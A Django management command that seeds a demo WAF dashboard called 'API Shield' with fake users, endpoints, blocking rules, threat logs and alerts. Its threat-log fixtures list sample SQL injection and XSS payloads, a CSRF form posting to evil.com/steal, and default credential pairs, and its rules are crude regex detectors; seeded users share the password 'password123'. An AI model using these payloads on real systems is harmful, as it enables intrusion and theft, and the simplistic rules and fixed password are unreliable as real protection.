from django.core.management.base import BaseCommand
from django.utils import timezone
from django.contrib.auth import get_user_model
from accounts.models import UserProfile
from api.models import APIEndpoint, WAFRule, ThreatLog, APIMetrics
from monitoring.models import SystemAlert, SystemMetrics
from datetime import datetime, timedelta
import random

User = get_user_model()


class Command(BaseCommand):
    help = 'Populate sample data for API Shield platform'

    def handle(self, *args, **options):
        self.stdout.write('Creating sample data...')
        
        # Create sample users
        self.create_sample_users()
        
        # Create sample API endpoints
        self.create_sample_endpoints()
        
        # Create sample WAF rules
        self.create_sample_waf_rules()
        
        # Create sample threat logs
        self.create_sample_threat_logs()
        
        # Create sample metrics
        self.create_sample_metrics()
        
        # Create sample alerts
        self.create_sample_alerts()
        
        self.stdout.write(self.style.SUCCESS('Sample data created successfully!'))

    def create_sample_users(self):
        """Create sample users."""
        users_data = [
            {
                'username': 'john_doe',
                'email': 'john@example.com',
                'first_name': 'John',
                'last_name': 'Doe',
                'role': 'admin',
                'company_name': 'TechCorp',
                'is_verified': True
            },
            {
                'username': 'jane_smith',
                'email': 'jane@example.com',
                'first_name': 'Jane',
                'last_name': 'Smith',
                'role': 'user',
                'company_name': 'TechCorp',
                'is_verified': True
            },
            {
                'username': 'bob_wilson',
                'email': 'bob@example.com',
                'first_name': 'Bob',
                'last_name': 'Wilson',
                'role': 'viewer',
                'company_name': 'TechCorp',
                'is_verified': True
            }
        ]
        
        for user_data in users_data:
            user, created = User.objects.get_or_create(
                email=user_data['email'],
                defaults=user_data
            )
            if created:
                user.set_password('password123')
                user.save()
                UserProfile.objects.create(user=user)
                self.stdout.write(f'Created user: {user.email}')

    def create_sample_endpoints(self):
        """Create sample API endpoints."""
        endpoints_data = [
            {
                'name': 'User Management API',
                'path': '/api/v1/users',
                'method': 'GET',
                'description': 'Retrieve user information',
                'status': 'active',
                'is_protected': True,
                'request_count': 125847,
                'avg_response_time': 45.2,
                'error_rate': 0.02
            },
            {
                'name': 'Authentication API',
                'path': '/api/v1/auth/login',
                'method': 'POST',
                'description': 'User authentication endpoint',
                'status': 'active',
                'is_protected': True,
                'request_count': 89234,
                'avg_response_time': 123.5,
                'error_rate': 0.15
            },
            {
                'name': 'Payment Processing API',
                'path': '/api/v1/payments',
                'method': 'POST',
                'description': 'Process payment transactions',
                'status': 'active',
                'is_protected': True,
                'request_count': 45621,
                'avg_response_time': 234.8,
                'error_rate': 2.34
            },
            {
                'name': 'File Upload API',
                'path': '/api/v1/upload',
                'method': 'POST',
                'description': 'File upload endpoint',
                'status': 'active',
                'is_protected': False,
                'request_count': 12456,
                'avg_response_time': 456.3,
                'error_rate': 5.67
            },
            {
                'name': 'Comments API',
                'path': '/api/v1/comments',
                'method': 'GET',
                'description': 'Retrieve comments',
                'status': 'active',
                'is_protected': True,
                'request_count': 67890,
                'avg_response_time': 89.1,
                'error_rate': 0.05
            }
        ]
        
        for endpoint_data in endpoints_data:
            endpoint, created = APIEndpoint.objects.get_or_create(
                path=endpoint_data['path'],
                method=endpoint_data['method'],
                defaults=endpoint_data
            )
            if created:
                self.stdout.write(f'Created endpoint: {endpoint.path}')

    def create_sample_waf_rules(self):
        """Create sample WAF rules."""
        admin_user = User.objects.filter(role='admin').first()
        
        rules_data = [
            {
                'name': 'SQL Injection Protection',
                'description': 'Block SQL injection attempts',
                'rule_type': 'sql_injection',
                'severity': 'high',
                'pattern': r'(?i)(union|select|insert|update|delete|drop|create|alter).*?(from|into|where)',
                'is_active': True,
                'action': 'block'
            },
            {
                'name': 'XSS Protection',
                'description': 'Block cross-site scripting attacks',
                'rule_type': 'xss',
                'severity': 'high',
                'pattern': r'(?i)<script.*?>.*?</script>|<.*?javascript:.*?>|<.*?onload=.*?>',
                'is_active': True,
                'action': 'block'
            },
            {
                'name': 'CSRF Protection',
                'description': 'Block CSRF attacks',
                'rule_type': 'csrf',
                'severity': 'medium',
                'pattern': r'(?i)(csrf|xsrf)',
                'is_active': True,
                'action': 'block'
            },
            {
                'name': 'Brute Force Protection',
                'description': 'Block brute force attacks',
                'rule_type': 'brute_force',
                'severity': 'medium',
                'pattern': r'(?i)(admin|root|password|123456)',
                'is_active': True,
                'action': 'block'
            },
            {
                'name': 'File Upload Protection',
                'description': 'Block malicious file uploads',
                'rule_type': 'file_upload',
                'severity': 'high',
                'pattern': r'(?i)\.(php|asp|aspx|jsp|exe|bat|cmd|sh)$',
                'is_active': True,
                'action': 'block'
            }
        ]
        
        for rule_data in rules_data:
            rule, created = WAFRule.objects.get_or_create(
                name=rule_data['name'],
                defaults={**rule_data, 'created_by': admin_user}
            )
            if created:
                # Associate with all endpoints
                rule.endpoints.set(APIEndpoint.objects.all())
                self.stdout.write(f'Created WAF rule: {rule.name}')

    def create_sample_threat_logs(self):
        """Create sample threat logs."""
        endpoints = list(APIEndpoint.objects.all())
        waf_rules = list(WAFRule.objects.all())
        users = list(User.objects.all())
        
        threat_types = ['sql_injection', 'xss', 'csrf', 'brute_force', 'file_upload', 'ddos', 'bot', 'suspicious']
        statuses = ['blocked', 'allowed', 'quarantined']
        severities = ['low', 'medium', 'high', 'critical']
        
        # Define realistic threat details for each type
        threat_details = {
            'sql_injection': [
                {
                    'payload': "'; DROP TABLE users; --",
                    'target_parameter': 'username',
                    'detection_method': 'pattern_match',
                    'confidence': 0.95,
                    'description': 'SQL injection attempt using DROP TABLE'
                },
                {
                    'payload': "' OR 1=1; --",
                    'target_parameter': 'id',
                    'detection_method': 'pattern_match',
                    'confidence': 0.92,
                    'description': 'SQL injection using OR condition'
                },
                {
                    'payload': "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                    'target_parameter': 'email',
                    'detection_method': 'pattern_match',
                    'confidence': 0.98,
                    'description': 'SQL injection with INSERT statement'
                },
                {
                    'payload': "' UNION SELECT * FROM passwords; --",
                    'target_parameter': 'search',
                    'detection_method': 'pattern_match',
                    'confidence': 0.94,
                    'description': 'SQL injection with UNION query'
                }
            ],
            'xss': [
                {
                    'payload': '<script>alert("XSS")</script>',
                    'target_parameter': 'comment',
                    'detection_method': 'pattern_match',
                    'confidence': 0.96,
                    'description': 'Basic XSS script injection'
                },
                {
                    'payload': '<img src="x" onerror="alert(1)">',
                    'target_parameter': 'message',
                    'detection_method': 'pattern_match',
                    'confidence': 0.93,
                    'description': 'XSS using img onerror event'
                },
                {
                    'payload': 'javascript:alert("XSS")',
                    'target_parameter': 'url',
                    'detection_method': 'pattern_match',
                    'confidence': 0.91,
                    'description': 'XSS using javascript: protocol'
                },
                {
                    'payload': '<svg onload="alert(1)">',
                    'target_parameter': 'content',
                    'detection_method': 'pattern_match',
                    'confidence': 0.94,
                    'description': 'XSS using SVG onload event'
                }
            ],
            'csrf': [
                {
                    'payload': '<form action="http://evil.com/steal" method="POST">',
                    'target_parameter': 'csrf_token',
                    'detection_method': 'pattern_match',
                    'confidence': 0.89,
                    'description': 'CSRF form injection attempt'
                },
                {
                    'payload': 'document.cookie',
                    'target_parameter': 'token',
                    'detection_method': 'pattern_match',
                    'confidence': 0.87,
                    'description': 'CSRF token theft attempt'
                }
            ],
            'brute_force': [
                {
                    'payload': 'admin:password',
                    'target_parameter': 'credentials',
                    'detection_method': 'rate_limit',
                    'confidence': 0.85,
                    'description': 'Brute force login attempt'
                },
                {
                    'payload': 'root:123456',
                    'target_parameter': 'username',
                    'detection_method': 'rate_limit',
                    'confidence': 0.88,
                    'description': 'Common password brute force'
                },
                {
                    'payload': 'admin:admin',
                    'target_parameter': 'password',
                    'detection_method': 'rate_limit',
                    'confidence': 0.86,
                    'description': 'Default credential brute force'
                }
            ],
            'file_upload': [
                {
                    'payload': 'shell.php',
                    'target_parameter': 'filename',
                    'detection_method': 'file_extension',
                    'confidence': 0.97,
                    'description': 'PHP shell file upload attempt'
                },
                {
                    'payload': 'malware.exe',
                    'target_parameter': 'file',
                    'detection_method': 'file_extension',
                    'confidence': 0.95,
                    'description': 'Executable file upload attempt'
                },
                {
                    'payload': 'backdoor.jsp',
                    'target_parameter': 'upload',
                    'detection_method': 'file_extension',
                    'confidence': 0.93,
                    'description': 'JSP backdoor upload attempt'
                }
            ],
            'ddos': [
                {
                    'payload': 'flood_request',
                    'target_parameter': 'requests_per_second',
                    'detection_method': 'rate_analysis',
                    'confidence': 0.91,
                    'description': 'High volume request flood'
                },
                {
                    'payload': 'slowloris_attack',
                    'target_parameter': 'connection_duration',
                    'detection_method': 'connection_analysis',
                    'confidence': 0.89,
                    'description': 'Slowloris DDoS attack pattern'
                }
            ],
            'bot': [
                {
                    'payload': 'scraper_bot',
                    'target_parameter': 'user_agent',
                    'detection_method': 'bot_detection',
                    'confidence': 0.84,
                    'description': 'Automated scraping bot detected'
                },
                {
                    'payload': 'crawler_bot',
                    'target_parameter': 'behavior_pattern',
                    'detection_method': 'behavior_analysis',
                    'confidence': 0.82,
                    'description': 'Automated crawling bot detected'
                }
            ],
            'suspicious': [
                {
                    'payload': 'directory_traversal',
                    'target_parameter': 'path',
                    'detection_method': 'pattern_match',
                    'confidence': 0.78,
                    'description': 'Directory traversal attempt'
                },
                {
                    'payload': 'command_injection',
                    'target_parameter': 'input',
                    'detection_method': 'pattern_match',
                    'confidence': 0.81,
                    'description': 'Command injection attempt'
                },
                {
                    'payload': 'ldap_injection',
                    'target_parameter': 'query',
                    'detection_method': 'pattern_match',
                    'confidence': 0.79,
                    'description': 'LDAP injection attempt'
                }
            ]
        }
        
        # Delete existing threat logs
        ThreatLog.objects.all().delete()
        self.stdout.write('Deleted existing threat logs')
        
        # Create threat logs for the last 30 days
        for i in range(100):
            days_ago = random.randint(0, 30)
            hours_ago = random.randint(0, 23)
            minutes_ago = random.randint(0, 59)
            
            timestamp = timezone.now() - timedelta(
                days=days_ago,
                hours=hours_ago,
                minutes=minutes_ago
            )
            
            threat_type = random.choice(threat_types)
            threat_detail = random.choice(threat_details[threat_type])
            
            threat_log = ThreatLog.objects.create(
                threat_type=threat_type,
                status=random.choice(statuses),
                severity=random.choice(severities),
                source_ip=f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                user_agent=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500, 600)}.0",
                request_path=random.choice(endpoints).path,
                request_method=random.choice(['GET', 'POST', 'PUT', 'DELETE']),
                request_headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
                request_body=threat_detail['payload'],
                response_code=random.choice([200, 403, 404, 500]),
                response_time=random.uniform(10, 500),
                endpoint=random.choice(endpoints),
                waf_rule=random.choice(waf_rules) if random.random() > 0.3 else None,
                user=random.choice(users) if random.random() > 0.7 else None,
                details=threat_detail,
                notes=random.choice(['', 'Suspicious activity detected', 'Automated threat blocked', threat_detail['description']]),
                timestamp=timestamp
            )
            
            # Update WAF rule trigger count
            if threat_log.waf_rule:
                threat_log.waf_rule.trigger_count += 1
                threat_log.waf_rule.save()
        
        self.stdout.write('Created 100 sample threat logs with realistic threat details')

    def create_sample_metrics(self):
        """Create sample API metrics."""
        endpoints = list(APIEndpoint.objects.all())
        
        # Create metrics for the last 7 days
        for i in range(7):
            date = timezone.now().date() - timedelta(days=i)
            
            for hour in range(24):
                for endpoint in endpoints:
                    total_requests = random.randint(100, 10000)
                    successful_requests = int(total_requests * (1 - endpoint.error_rate / 100))
                    failed_requests = total_requests - successful_requests
                    
                    APIMetrics.objects.create(
                        endpoint=endpoint,
                        date=date,
                        hour=hour,
                        total_requests=total_requests,
                        successful_requests=successful_requests,
                        failed_requests=failed_requests,
                        avg_response_time=endpoint.avg_response_time + random.uniform(-10, 10),
                        min_response_time=max(1, endpoint.avg_response_time - random.uniform(0, 50)),
                        max_response_time=endpoint.avg_response_time + random.uniform(0, 100),
                        blocked_requests=random.randint(0, int(total_requests * 0.1)),
                        threat_count=random.randint(0, int(total_requests * 0.05)),
                        error_4xx_count=random.randint(0, int(failed_requests * 0.7)),
                        error_5xx_count=random.randint(0, int(failed_requests * 0.3))
                    )
        
        self.stdout.write('Created sample API metrics')

    def create_sample_alerts(self):
        """Create sample system alerts."""
        alert_data = [
            {
                'title': 'High Error Rate Detected',
                'message': 'API endpoint /api/v1/payments is experiencing high error rates',
                'alert_type': 'performance',
                'severity': 'high',
                'status': 'active'
            },
            {
                'title': 'Suspicious Activity Detected',
                'message': 'Multiple failed login attempts from IP 192.168.1.100',
                'alert_type': 'security',
                'severity': 'medium',
                'status': 'acknowledged'
            },
            {
                'title': 'WAF Rule Triggered',
                'message': 'SQL injection attempt blocked on /api/v1/users',
                'alert_type': 'security',
                'severity': 'high',
                'status': 'active'
            },
            {
                'title': 'System Maintenance',
                'message': 'Scheduled maintenance window starting in 2 hours',
                'alert_type': 'info',
                'severity': 'low',
                'status': 'active'
            }
        ]
        
        for alert_info in alert_data:
            SystemAlert.objects.create(**alert_info)
        
        self.stdout.write('Created sample system alerts') 